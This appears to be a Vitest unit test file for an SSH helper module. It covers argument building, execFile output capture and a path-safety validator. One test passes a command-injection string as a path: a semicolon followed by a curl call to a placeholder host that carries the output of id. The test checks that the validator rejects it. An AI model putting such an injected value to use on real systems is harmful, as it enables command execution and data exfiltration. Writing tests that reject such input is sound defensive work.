import { describe, it, expect, vi } from "vitest";
import os from "node:os";

const mockExecFile = vi.hoisted(() => vi.fn());
vi.mock("node:child_process", () => ({ execFile: mockExecFile }));

import { buildSshArgs, execCapture, isSafeAbsolutePath } from "./ssh.js";

describe("buildSshArgs", () => {
  it("emits the three -o flags in order", () => {
    const args = buildSshArgs({ host: "10.0.0.1" });
    expect(args.slice(0, 6)).toEqual([
      "-o", "StrictHostKeyChecking=accept-new",
      "-o", "ConnectTimeout=10",
      "-o", "BatchMode=yes",
    ]);
  });

  it("omits -p when port is undefined", () => {
    const args = buildSshArgs({ host: "10.0.0.1" });
    expect(args).not.toContain("-p");
    expect(args).not.toContain("-P");
  });

  it("omits -p when port is 22", () => {
    const args = buildSshArgs({ host: "10.0.0.1", port: 22 });
    expect(args).not.toContain("-p");
    expect(args).not.toContain("-P");
  });

  it("emits -p for a non-default ssh port", () => {
    const args = buildSshArgs({ host: "10.0.0.1", port: 2222 });
    expect(args).toContain("-p");
    expect(args[args.indexOf("-p") + 1]).toBe("2222");
  });

  it("emits -P instead of -p when scp is true", () => {
    const args = buildSshArgs({ host: "10.0.0.1", port: 2222 }, { scp: true });
    expect(args).toContain("-P");
    expect(args).not.toContain("-p");
    expect(args[args.indexOf("-P") + 1]).toBe("2222");
  });

  it("emits -i with a resolveIdentityFile-expanded path", () => {
    const args = buildSshArgs({ host: "10.0.0.1", identityFile: "~/.ssh/id_ed25519" });
    expect(args).toContain("-i");
    expect(args[args.indexOf("-i") + 1]).toBe(`${os.homedir()}/.ssh/id_ed25519`);
  });

  it("uses StrictHostKeyChecking=yes when requested", () => {
    const args = buildSshArgs({ host: "10.0.0.1" }, { strictHostKeyChecking: "yes" });
    expect(args).toContain("StrictHostKeyChecking=yes");
  });
});

describe("execCapture", () => {
  it("resolves stdout on success", async () => {
    mockExecFile.mockImplementation((_cmd, _args, _opts, cb) => cb(null, "out", ""));
    await expect(execCapture("ssh", [])).resolves.toBe("out");
  });

  it("rejects with trimmed stderr when both stderr and err are present", async () => {
    mockExecFile.mockImplementation((_cmd, _args, _opts, cb) => cb(new Error("boom"), "", "  bad\n"));
    await expect(execCapture("ssh", [])).rejects.toThrow("bad");
  });

  it("falls back to err.message when stderr is empty", async () => {
    mockExecFile.mockImplementation((_cmd, _args, _opts, cb) => cb(new Error("boom"), "", ""));
    await expect(execCapture("ssh", [])).rejects.toThrow("boom");
  });

  it("passes timeout/maxBuffer/env through to execFile's options", async () => {
    mockExecFile.mockImplementation((_cmd, _args, _opts, cb) => cb(null, "out", ""));
    const env = { FOO: "bar" };
    await execCapture("ssh", [], { timeout: 5000, maxBuffer: 1234, env });
    expect(mockExecFile).toHaveBeenCalledWith(
      "ssh",
      [],
      { timeout: 5000, maxBuffer: 1234, env },
      expect.any(Function),
    );
  });

  it("defaults maxBuffer to 4 MiB when not supplied", async () => {
    mockExecFile.mockImplementation((_cmd, _args, _opts, cb) => cb(null, "out", ""));
    await execCapture("ssh", []);
    expect(mockExecFile).toHaveBeenCalledWith(
      "ssh",
      [],
      { maxBuffer: 4 * 1024 * 1024 },
      expect.any(Function),
    );
  });
});

describe("isSafeAbsolutePath", () => {
  it("accepts a plain absolute path", () => {
    expect(isSafeAbsolutePath("/home/actions/actions-runner")).toBe(true);
  });
  it("rejects a path with shell metacharacters", () => {
    expect(isSafeAbsolutePath("/home/actions; curl http://x/$(id)")).toBe(false);
  });
  it("rejects a relative path", () => {
    expect(isSafeAbsolutePath("home/actions")).toBe(false);
  });
});
